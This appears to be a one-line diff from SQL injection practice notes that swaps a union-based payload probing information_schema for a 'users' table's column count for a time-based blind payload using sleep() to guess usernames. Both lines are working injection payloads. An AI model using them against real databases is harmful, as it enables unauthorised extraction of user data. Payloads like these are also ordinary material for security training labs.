@@ -1,1 +1,1 @@
-select * from users where username='nonuser' union select 1,2,3 from information_schema.columns where table_schema='sqli_three' and table_name = 'users'  and 1 = (select if(3 = (select count(column_name) from information_schema.columns where table_schema='sqli_three' and table_name = 'users') , 1 , 4)) -- -
+union select 1,sleep(2) from users where username like 'a%' -- -
